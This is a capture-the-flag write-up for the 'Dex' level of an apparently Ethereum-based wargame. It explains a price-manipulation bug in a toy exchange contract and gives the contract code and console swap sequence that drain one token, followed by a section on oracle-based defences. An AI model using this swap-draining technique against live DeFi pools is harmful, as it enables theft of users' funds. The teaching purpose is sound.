# 22. Dex
<sup>Difficulty 3/10</sup>

The goal of this level is for you to hack the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_exchange) contract below and steal the funds by price manipulation.

You will start with 10 tokens of `token1` and 10 of `token2`. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

### Quick note

Normally, when you make a swap with an ERC20 token, you have to `approve` the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the `approve` method to the contract itself. So feel free to use `contract.approve(contract.address, <uint amount>)` instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the `SwappableToken` contract otherwise.

Things that might help:

- How is the price of the token calculated?
- How does the `swap` method work?
- How do you `approve` a transaction of an ERC20?

## Solution

The bug resiedes into the `getSwapPrice` function

```solidity
function getSwapPrice(address from, address to, uint amount) public view returns(uint){
	return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
}
```

The swap price is calculated as: `amount * to / from`, where `to` and `from` refer to the contract balance. Let's do some math:

| Player TK1 | Player TK2 | Contract TK1 | Contract TK2 | Swap Formula   | Swap Value |
|:-----------|:-----------|:-------------|:-------------|:---------------|:-----------|
| 10         | 10         | 100          | 100          | 10 * 100 / 100 | 10         |
| 0          | 20         | 110          | 90           | 20 * 110 / 90  | 24         |
| 24         | 0          | 86           | 110          | 24 * 110 / 86  | 30         |
| 0          | 30         | 110          | 80           | 30 * 110 / 80  | 41         |
| 41         | 0          | 69           | 110          | 41 * 110 / 69  | 65         |
| 0          | 65         | 110          | 45           | 65 * 110 / 45  | 158        |

Last operation will throw an error since wallet does not have enough token, hence we need to find the token we have to swap to get them all: `x * 110 / 45 = 110` => `x = 45`.

Then the last step would be:

| Player TK1 | Player TK2 | Contract TK1 | Contract TK2 | Swap Formula      | Swap Value |
|:-----------|:-----------|:-------------|:-------------|:------------------|:-----------|
| 0          | 65         | 110          | 45           | **45** * 110 / 45 | 110        |
| 110        | 20         | 0            | 90           | -                 | -          |

The only thing that remains is to perform these operation!

The provided `approve` function doesn't work. To our token transaction we need to use the provided `SwappableToken` contract.

```solidity
//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/v3.4.0/contracts/token/ERC20/IERC20.sol";
import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/v3.4.0/contracts/token/ERC20/ERC20.sol";
import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/v3.4.0/contracts/access/Ownable.sol";

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

contract Dex {
    address tk1 = 0xF1008cC8AEf2c6ee990a09674E465970B7A54a6d;
    address tk2 = 0x96b0E49Ee18E95151ea7aD3b97C7561299ab1FfE;
    function approve(address tk) private {
        SwappableToken(tk).approve(msg.sender, 0x10429c9ae5A712726ADE845388a791b8542a0d4A, 1000);  // Contract address
    }
    function approveTk1() public {
        approve(tk1);
    }
    function approveTk2() public {
        approve(tk2);
    }
}
```

Now approve both token transaction and let's start do math! You can always check the balances with `balanceOf` mehtod

```javascript
await contract.swap(tk1, tk2, 10)
await contract.swap(tk2, tk1, 20)
await contract.swap(tk1, tk2, 24)
await contract.swap(tk2, tk1, 30)
(await contract.balanceOf(tk1, player)).toString()
// -> '41'
(await contract.balanceOf(tk2, player)).toString()
// -> '0'
(await contract.balanceOf(tk1, contract.address)).toString()
// -> '69'
(await contract.balanceOf(tk2, contract.address)).toString()
// -> '110'
await contract.swap(tk1, tk2, 41)
await contract.swap(tk2, tk1, 45)
(await contract.balanceOf(tk1, player)).toString()
// -> '110'
(await contract.balanceOf(tk2, player)).toString()
// -> '20'
(await contract.balanceOf(tk1, contract.address)).toString()
// -> '0'
(await contract.balanceOf(tk2, contract.address)).toString()
// -> '90'
```

We did it!

```
(⌐■_■) Well done, You have completed this level!!!
```

## OZ Corner

The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.

You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.

The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. This is why we need [oracles](https://betterprogramming.pub/what-is-a-blockchain-oracle-f5ccab8dbd72?source=friends_link&sk=d921a38466df8a9176ed8dd767d8c77d). Oracles are ways to get data into and out of smart contracts. We should be getting our data from multiple independent decentralized sources, otherwise we can run this risk.

[Chainlink Data Feeds](https://docs.chain.link/docs/get-the-latest-price) are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer [secure randomness](https://docs.chain.link/docs/chainlink-vrf), ability to make any [API call](https://docs.chain.link/docs/make-a-http-get-request), [modular oracle network creation](https://docs.chain.link/docs/architecture-decentralized-model), [upkeep, actions, and maintainance](https://docs.chain.link/docs/kovan-keeper-network-beta), and unlimited customization.

[Uniswap TWAP Oracles](https://uniswap.org/docs/v2/core-concepts/oracles/) relies on a time weighted price model called [TWAP](https://en.wikipedia.org/wiki/Time-weighted_average_price#). While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.

Here is an example of getting data from a Chainlink data feed (on the kovan testnet):

```solidity
pragma solidity ^0.6.7;

import "@chainlink/contracts/src/v0.6/interfaces/AggregatorV3Interface.sol";

contract PriceConsumerV3 {

    AggregatorV3Interface internal priceFeed;

    /**
     * Network: Kovan
     * Aggregator: ETH/USD
     * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331
     */
    constructor() public {
        priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331);
    }

    /**
     * Returns the latest price
     */
    function getLatestPrice() public view returns (int) {
        (
            uint80 roundID, 
            int price,
            uint startedAt,
            uint timeStamp,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();
        return price;
    }
}
```
